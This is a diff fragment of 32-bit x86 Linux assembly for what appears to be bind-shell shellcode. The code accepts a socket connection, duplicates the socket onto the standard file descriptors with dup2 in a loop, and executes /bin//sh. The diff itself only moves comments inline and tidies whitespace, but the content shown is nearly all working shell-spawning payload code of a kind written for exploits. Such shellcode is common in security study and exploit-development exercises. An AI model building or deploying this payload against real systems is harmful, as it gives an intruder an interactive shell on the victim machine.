@@ -303,12 +303,10 @@ _start:
     xor esi, esi           ; Clearing ESI for 4th argument - 0
     int 0x80               ; Execute accept4 syscall
     
-    ; Storing the return value connection socket fd in EAX to EBX for later usage
-    mov ebx, eax
-    ; Initializing a counter variable = 3 for loop
-    mov cl, 0x3    
+    mov ebx, eax           ; Storing the return value connection socket fd in EAX to EBX for later usage
+    mov cl, 0x3            ; Initializing a counter variable = 3 for loop
 
-    ; dup2() Syscall in loop
+	; dup2() Syscall in loop
     loop_dup2:
     mov al, 0x3f           ; dup2() Syscall number = 63 OR 0x3f
     dec ecx                ; Decrement ECX by 1
@@ -319,7 +317,7 @@ _start:
     push edx               ; push for NULL termination - EDX already set to 0
     push dword 0x68732f2f  ; push //sh
     push dword 0x6e69622f  ; push /bin
-    mov ebx, esp           ; store address of TOS - /bin//sh
+    mov ebx, esp           ; store address of TOS - /bin//sh in EBX
     mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
     int 0x80               ; Execute the system call
 ```
